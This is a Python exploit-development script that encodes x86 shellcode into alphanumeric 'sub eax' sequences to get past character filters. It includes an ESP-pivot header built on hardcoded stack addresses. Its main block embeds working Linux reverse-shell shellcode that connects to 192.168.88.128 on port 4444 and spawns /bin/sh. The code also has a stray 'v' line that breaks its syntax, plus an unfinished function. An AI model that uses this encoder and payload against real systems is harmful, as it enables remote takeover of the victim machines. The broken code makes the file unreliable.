import binascii

MAX_DEPTH = 1
GOAL_DEPTH = 0
FIRST_RUN = True
usable_chars = [ '%', '_', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l',
                 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
                 'z', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K',
                 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W',
                 'X', 'Y', 'Z', '-' ]



def find_char(end_val, start_val, char_list, depth):
    
    global usable_chars
    global GOAL_DEPTH
    global MAX_DEPTH

    success = False
    depth += 1
    
    if depth > MAX_DEPTH:
        return False
    
    for char in usable_chars:
        test_val = (ord(end_val) + ord(char)) & 0x000000ff
        #print("Goal: %d value: %d End: %d Depth: %d" % (ord(start_val),test_val, ord(end_val), depth))
        if chr(test_val) == start_val:
            #print("Hit!: %s" % char)
            if depth >= GOAL_DEPTH:
                char_list.insert(0,char)
                success = True        
                
    if success == True and depth > GOAL_DEPTH:
        GOAL_DEPTH = depth
        #print("Setting Goal depth: %d" % GOAL_DEPTH)
        
    if not success:
        #print("Recursion! %d" % depth)
        for char in usable_chars:
            #print("%s: " % char, end='')
            test_val = (ord(end_val) + ord(char)) & 0x000000ff
            result = find_char(chr(test_val), start_val, char_list, depth)
            if result != False:
                char_list.insert(0,char)
                depth = result
                #print("%d" % depth)
                break
            
        if result == False:
            #print("Returning False: %d" % depth)
            return False
        
    return depth

def check_depth(dword):
    global GOAL_DEPTH
    global MAX_DEPTH
    
    balanced = True

##    if GOAL_DEPTH == 0:
##        #print("Goal depth is 0")
##        return False
    #print("Passed goal depth check")
    for byte in dword:
        #print(byte['depth'])
        if byte['depth'] == False:
            MAX_DEPTH += 1
            #print("Going Deeper")
            return False
        elif byte['depth'] != GOAL_DEPTH:
            balanced = False

    return balanced

def get_carry(byte):
    sum = ord(byte['start_val'])
    for char in byte['char_list']:
        #print("Sum: %d" % sum)
        sum += ord(char)
    #print("Carry: %d" % sum) 
    #print("Carry: %d" % ((sum & 0x0000ff00) >> 8))  
    return (sum & 0x0000ff00) >> 8

def hex_print(byte):
    global GOAL_DEPTH
    for i in range(0,GOAL_DEPTH):
        value = ''
        for byte_count in range(0,len(byte)):
            value = hex(ord(byte[byte_count]['char_list'][i]))[2:] + value
        print('0x' + value)

def hex_print_start(dword):
    hex_dword = ""

    for byte in dword:
        hex_dword = hex(ord(byte['start_val']))[2:] + hex_dword
    print("0x" + hex_dword)

def hex_print_end(dword):
    hex_dword = ""
  
    for byte in dword:
        hex_dword = hex(ord(byte['end_val']))[2:] + hex_dword
    print("0x" + hex_dword)
    
def build_byte_string(shellcode, format = "hex", chain = False):
    """Take a string of shellcode and convert it into a byte string

        This function takes a dword that has had it's char_list populated with characters
        to reach the end value, it loops through each layer until it reaches the deepest point.
    Args:
        dword: a fully populated dword structure loaded with 4 bytes with values to be printed
        output: an option argument, values are python for python/c compatible output or hex
        no_heders: a boolean argument, used to remove printing of 
        
    Returns:
        nothing, this function simply prints output
        
    TODO:
        Modify to return a value, make function more extensible and flexible to allow printing more
        opcodes.
    """
    byte_string = []
    previous_dword = ['\x00', '\x00', '\x00', '\x00']
    y = 0
    
    if format == "hex":
        pad_count = len(shellcode) // 2
        if(pad_count % 2 != 0):
            print("Invalid hex string, missing a byte")
            exit()
        pad_count = pad_count % 4
        shellcode += "90" * pad_count

        for i in range(0,len(shellcode),2):
            current_byte = chr(int(shellcode[i:i+2], 16))
           
            byte_string.append({'start_val':current_byte, 'end_val':previous_dword[y], 'depth':0, 'char_list': []})
            
    v
                    
    if format == "python":
        #print(len(shellcode))
        shellcode = "\x83\xec\x60" + shellcode
        pad_count = len(shellcode) % 4
        shellcode += "\x90" * pad_count

        for current_byte in shellcode:
            byte_string.append({'start_val':current_byte, 'end_val':'\x00', 'depth':0, 'char_list': []})
        
        if chain == True:
            y = 3
            for i in range(len(byte_string),0, -1):
                #print("Using as start value" + hex(ord(previous_dword[y])))
                #print("Goal value: " + hex(ord(byte_string[i-1]['start_val'])))
                #print(i, end ="")
                byte_string[i-1]['end_val'] = previous_dword[y]
                previous_dword[y] = byte_string[i-1]['start_val']
                y -= 1
                if y == -1:
                    y = 3
    
    return byte_string


def generate_shellcode(byte_string):
    """ Takes a string of bytes, calculates end values and prints shellcode output

        This function takes a bytestring which is a list of dictionaries, breaks it up into dwords
        takes each of those dwords and generates the steps to reach the end value and prints the output
        as shellcode.
        
    Args:
        byte_string: a list of dictionaries that has been formatted to match our byte_string structure
        
    Returns:
        nothing, this function simply prints output
        
    TODO:
        Modify to return a value
    """
    # This is a temporary list to store 4 bytes extracted from our byte string
    dword = []
    # Build and print our shellcode header
    build_shellcode_header('0xbffff72c','0xbffff600')
    # We need to work backwards through our list due to fact the stack grows upwards, we start at the end
    # working backwards 4 bytes at a time
    for i in range((len(byte_string)-1),0,-4):
        #append 4 bytes to the dword starting with the last due to intels endianness
        dword.append(byte_string[i-3])
        dword.append(byte_string[i-2])
        dword.append(byte_string[i-1])
        dword.append(byte_string[i])
##        print("")        
##        hex_print_end(dword)
        # Encode our built dword
        encode_dword(dword)
##        hex_print_start(dword)
##        print("")
##        hex_print(dword)
##        print("")
        #input("")
        # Print the generated values
        print_shellcode(dword, output = "python", chain = True)
        # Reset the dword ready for the next 4 bytes of the byte_string
        dword.clear()

def print_shellcode(dword, output = "python", chain = False, no_headers = False):
    """ Prints shellcode from our calculated dword

        This function takes a dword that has had it's char_list populated with characters
        to reach the end value, it loops through each layer until it reaches the deepest point.
    Args:
        dword: a fully populated dword structure loaded with 4 bytes with values to be printed
        output: an option argument, values are python for python/c compatible output or hex
        no_heders: a boolean argument, used to remove printing of 
        
    Returns:
        nothing, this function simply prints output
        
    TODO:
        Modify to return a value, make function more extensible and flexible to allow printing more
        opcodes.
    """
    # The deepest point is used as a reference to know how many layers to print
    global GOAL_DEPTH

    # The opcodes to clear the eax register
    clear_eax = "\\x25\\x25\\x25\\x25\\x25\\x25\\x42\\x42\\x42\\x42"
    push_eax  = "\\x50"
    #This variable will store our printable hex character
    value = ''
        
    # If we are chaining to use the previous byte as the start_val of the previous result
    # we do not need to clear eax each time we output the shellcode, we also provide the option
    # of not printing eax each time
    # Should this be moved out of the fucntion?
    if (chain == False and no_headers == False):
        #print("Clear")
        print(clear_eax, end="")
    # Starting at 0 we loop through to the deepest point
    for i in range(0,GOAL_DEPTH):
        # If we want python/c compatible output
        if output == "python":
            #print the sub opcode
            print("\\x2d", end="")
        # otherwise we print straight hex
        elif output == "hex":
            print("2d", end="")
        # work through each byte in the dword
        for byte in dword:
            # This line takes the character stored at depth i of the byte, converts it into a hex character
            # and takes a slice of it to remove the 0x leaving us with a printable hex string we can manipulate
            value = hex(ord(byte['char_list'][i]))[2:]
            # if our desired output is python formatted we need to append \x 
            if(output == "python"):
                value = "\\x" + value
            print(value, end="")
    # once we have looped through all layers of the characters and built all sub statements, we need to
    # print a push eax 
    if no_headers == False:
        print(push_eax, end="")

def find_and(start_val, end_val):
    """ Calculates two and values to get from start to end

    WARNING THIS FUNCTION IS NOT FULLY IMPLEMENTED!!!
    
    This function takes a start value and using bitewise and attempts
    to reach end val with only values in usable_chars.

    e.g:
        mov eax, 0x12345678
        and eax, 0x25252525
        -------------------
        eax ==   0x00240420
        and eax, 0x42424242
        -------------------
        eax ==   0x00000000
    

    Args:
        start_val: The initial value of the inital byte
        goal_mem: The goal value of the byte
        
    Returns:
        A list of lists of pairs of characters that can be and'd

    TODO:
        Function is quite broken, currently in testing.
    """
    
    and_pair = []
    for char in usable_chars:
        for second_char in usable_chars:
            if (ord(char) & ord(second_char) == ord(end_val)):
                and_pair.append([char, second_char])

    #print(hex(ord(and_pair[0][0])))
    #print(hex(ord(and_pair[0][1])))


def build_shellcode_header(start_mem, goal_mem):
    """Creates and prints the first section of shellcode.

    This function builds and prints the first section of shellcode
    this is very rigid at the moment and is only used create shellcode
    that takes the following format:

    push esp
    pop  eax
    sub  eax, 0xXXXXXXXX
    sub  eax, 0xXXXXXXXX
    push eax
    pop  esp
    and  eax, 0xZZZZZZZZ
    and  eax. 0xZZZZZZZZ

    This shellcode is intented to save esp, modify it by subtracting
    (or adding) the difference between start_mem and goal_mem, restoring
    this value back into esp and clearing eax ready for the next section of
    shellcode. All of this is done using bytes that fall into our usable_chars
    list.
    
    Args:
        start_mem: The initial value of ESP in the format 0x12345678
        goal_mem: The goal value of ESP in the format 0x12345678
        
    Returns:
        Nothing, this function only prints the headers.

    TODO:
        Modify the function to return the value generates as a varaible
        to allow building of shellcode rather than just printing.

        Move opcode variables values to another module maybe for ease of re-use

        Allow output of straight hex output, not just python/c compatible strings
    """

    # Define our opcodes, currently only in python/c format
    push_esp = "\\x54"  
    pop_eax  = "\\x58"
    push_eax = "\\x50"
    pop_esp  = "\\x5c"
    clear_eax = "\\x25\\x25\\x25\\x25\\x25\\x25\\x42\\x42\\x42\\x42"
 
    # This dword will store our goal_mem values and be used to compute the values
    # used in the sub eax instructions 
    dword = []

    # This check is to determine if the input was given in the correct format
    if len(start_mem) != 10 or len(goal_mem) != 10:
        print("Memory locations must be 8 digit hex in format 0x12345678")
        exit()

    # To convert the provided start_mem and goal_mem into a format compatible
    # with our encode_dword() function we need to loop 4 times through our two strings
    # starting at position 2 (skipping 0x) and moving 2 characters at a time
    for i in range(2,10,2):
        # Take the two characters of our string, convert them into a hex integer, convert this
        # hex value to an ascii character, this if the format required for the encode_dword()
        # function
        start_val = chr(int(start_mem[i:i+2], 16))
        end_val   = chr(int(goal_mem[i:i+2], 16))
        #print(start_val + " " + end_val)
        # Build our dword, inserting the newly created ascii value into the first position in
        # the dword, we need to reverse the end_val and the_start val due to how the value is calculated
        dword.insert(0,{'start_val': end_val, 'end_val': start_val, 'depth': 0, 'char_list': []})

    # Calculate the steps needed to be taken to go from start_mem to goal_mem by subtracting characters from each other
    # that fall into the usable_chars list
    encode_dword(dword)

    # Print the first two opcodes with no trailing EOL 
    print(push_esp + pop_eax, end="")
    # Print the opcodes used to go from start_mem to goal_mem without any extra opcodes
    print_shellcode(dword, no_headers = True)
    # Print the final two opcodes 
    print(push_eax + pop_esp, end="")
    # Print the opcodes to clear the eax register
    print(clear_eax, end="")
          
def encode_dword(dword):
    """Calculates the steps to take to go from start_val to end_val specified for each byte in the dword
        
    This function takes a dword structure containing a list of dictionaries.
     
    The dword list is walked through starting at the least significant bit, the steps to reach the goal_value
    are calculated and saved for each byte in it's char_list

    Args:
        dword a structure that is a list of 4 dictionries with the structure:
            'start_val':    : The value we are starting at
            'end_val':      : The value we are trying to reach
            'depth':        : The current depth (how many characters it takes to reach our goal)
            'char_list': [] : The list of characters

    Returns:
        Nothing, this function modifies the char_list of each byte provided to it.

    TODO:

    """
    # GOAL_DEPTH is used to record the byte with the longest depth.
    global GOAL_DEPTH

    # Max Depth is used to bound our recursive function, in order to find the most optimal depth
    # we recurse to MAX_DEPTH, if one of our bytes is not able to reach it's desired value with that depth
    # we increment MAX_DEPTH and run through each byte again.
    global MAX_DEPTH

    # Set our first run to be bounded at 1 character deep, maybe we'll get lucky.
    MAX_DEPTH = 1

    # Reset GOAL_DEPTH for our first run.
    GOAL_DEPTH = 0
    
    # The main loop driving the program, one thing we need to consider is that even though we are operating byte by byte
    # through the dword, we need to cater for the byte with the longest requirement. If one byte can reach our desired value
    # in two steps, but another requires 3 we need to go back and re-work the byte with the lower requirement to be equal to
    # the byte with the higher steps. We need to reconsider how the newly generated bytes will be affected by carries as well
    
    # The loop works via checking the depth, we record the byte with the deepest depth in the global var GOAL_DEPTH, we run through
    # this loop continually until all 4 bytes have the equivilent depth

    # The check depth function checks to see if all bytes have equal depths, if this is satisfied our loop stops.
    while not check_depth(dword):
        
        # We will work one byte at a time, if the addition of two values results in a carry (i.e the values subtracted from
        # each other require borrowing from the neighboring byte) we need to be aware of that and factor it into our calculation
        # each time we loop reset this back to 0.
        carry = 0

        # Temp val is used to store our bytes modified by carries
        temp_val = "\x00"

        for byte in dword:
            
##            print("Trying %s" % hex(ord(byte['start_val'])))
##            print("Trying %s" % hex(ord(byte['end_val'])))
##            byte['temp_val'] = byte['start_val']
            
            # Save our original start value in temp so we can restore it later, we might need to pass the modified
            # Start val that is affected by carries.
            temp_val = byte['start_val']
            # Clear our word list, if this is not our first run it might be populated
            byte['char_list'].clear()
            # Reset the depth back to 0, if it not our first run it might be another value
            byte['depth'] = 0
            
##            print("Before carry: %d" % ord(byte['start_val']))
            
            # If we have a carry from a previous calculation, add this too our start_val
            byte['start_val']=chr(ord(byte['start_val']) + carry)
            
##            print("After carry: %d" % ord(byte['start_val']))
            
            # This is where the magic happens, find the characters that are added together to reach our value
            # and save the these in the char_list, save the calculated depth.
            # This function is run each time through the loop with a reset depth because we assume 
            byte['depth'] = find_char(byte['start_val'], byte['end_val'], byte['char_list'], 0)
            # Calculate the carry value from our list and save it, this will be used to modify the next byte
            # we hit in the loop
            carry = get_carry(byte)
##            print("Done", byte['char_list'], byte['depth'], byte['start_val'])
            # Restore our start_val after we modified it with the carry, otherwise future calculations will be
            # based on failed loops.
            byte['start_val'] = temp_val
        
if __name__ == "__main__":
    """"
    The intention is to have a start value and an end value e.g: the start value is 0x00000000
    and an end value e.g. 0x12345678, using only the values provided in the global variable usable_chars
    find the values that can be subtracted from the start value to reach the end value.
    
        0x00000000
      - 0x735f5f25   (%__s)
        ----------
        0x8ca0a0db
      - 0x7a6c4a63   (cJlz)
        ----------
        0x12345678
     
    We will operate on 4 bytes at a time, a dword. These bytes will be stored in a list
    

    Establish our initial structure, loop 4 times with a dummy value, set the depth to 0 and create
    an empty list to store our calculated steps to reach the end value
    for i in range(0,4):
        dword.append({'start_val':'\x41','temp_val':'\x41', 'end_val':'\x00', 'depth':0, 'min_depth':(MAX_DEPTH + 1), 'char_list': []})

     Intel is big endian so we need to store the byte backwards
    dword[3]['value'] = '\x12'
    dword[2]['value'] = '\x34'
    dword[1]['value'] = '\x56'
    dword[0]['value'] = '\x78'

    We will work one byte at a time, if the addition of two values results in a carry (i.e the values subtracted from
    each other require borrowing from the neighboring byte) we need to be aware of that and factor it into our calculation


    """

    shellcode = "\x31\xdb\xf7\xe3\x50\xb0\x66\xb3\x01\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc2\xfe\xc3\x68\xc0\xa8\x58\x80\x66\x68\x11\x5c\x66\x53\x89\xe6\x6a\x10\x56\x52\x89\xe1\xb0\x66\xfe\xc3\xcd\x80\x89\xd3\x6a\x02\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x8d\x0c\x24\xb0\x0b\xcd\x80"
    
    byte_string = []
    # find_and('\x00','\x00')
    byte_string = build_byte_string(shellcode, format = "python", chain = True)
    generate_shellcode(byte_string)
    #print(byte_string)
    

    
